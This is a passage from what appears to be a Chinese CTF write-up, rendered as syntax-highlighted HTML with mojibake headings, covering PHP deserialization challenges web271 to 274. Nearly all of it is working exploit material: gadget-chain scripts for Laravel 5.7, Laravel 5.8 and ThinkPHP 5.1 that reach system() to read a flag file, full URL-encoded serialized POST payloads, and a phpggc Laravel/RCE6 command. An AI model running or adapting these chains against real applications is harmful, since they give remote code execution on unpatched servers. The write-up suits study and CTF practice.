punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"expectedOutput"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"expectedQuestions"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=></span>                <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string double-quoted-string">"concrete"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Illuminate\Foundation\Application"</span>                     <span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /fl*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$genericuser</span><span class="token punctuation">,</span>        <span class="token variable">$application</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æˆ–è€…ä½¿ç”¨phpgcc<code>php  phpggc Laravel/RCE6 &quot;system(&#39;cat /flag&#39;);&quot; --url</code></p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A44<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CTesting<span class="token operator">%</span><span class="token number">5</span>CPendingCommand<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>command<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>parameters<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span><span class="token operator">%</span><span class="token number">2</span>Ffl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>app<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A22<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>hasBeenBootstrapped<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>bindings<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CContracts<span class="token operator">%</span><span class="token number">5</span>CConsole<span class="token operator">%</span><span class="token number">5</span>CKernel<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>concrete<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A27<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CAuth<span class="token operator">%</span><span class="token number">5</span>CGenericUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>attributes<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedOutput<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedQuestions<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web272-273-Laravel5-8-ååºåˆ—åŒ–æ¼æ´"><a href="#web272-273-Laravel5-8-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web272-273(Laravel5.8 ååºåˆ—åŒ–æ¼æ´)"></a>web272-273(Laravel5.8 ååºåˆ—åŒ–æ¼æ´)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Line</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">QueuedCommand</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst<span class="token punctuation">\</span>Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockdefinition</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php system('cat /f*');exit;?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$evalloader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$evalloader</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$queuedcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">(</span><span class="token variable">$mockdefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingbroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$queuedcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingbroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æˆ–è€…ä½¿ç”¨phpgcc</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A29<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CSupport<span class="token operator">%</span><span class="token number">5</span>CMessageBag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>messages<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>format<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A40<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CPendingBroadcast<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>events<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBus<span class="token operator">%</span><span class="token number">5</span>CDispatcher<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>queueResolver<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CLoader<span class="token operator">%</span><span class="token number">5</span>CEvalLoader<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Di<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>load<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>event<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A38<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CBroadcastEvent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>connection<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A32<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockDefinition<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>config<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockConfiguration<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>abcdefg<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">%</span><span class="token number">20</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>exit<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web274-Thinkphp5-1ååºåˆ—åŒ–æ¼æ´"><a href="#web274-Thinkphp5-1ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web274(Thinkphp5.1ååºåˆ—åŒ–æ¼æ´)"></a>web274(Thinkphp5.1ååºåˆ—åŒ–æ¼æ´)</h4><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">Thinkphp5.1 ååºåˆ—åŒ–æ¼æ´å¤ç°</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> <span class="token comment">//PHPå‡½æ•°</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span>        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token 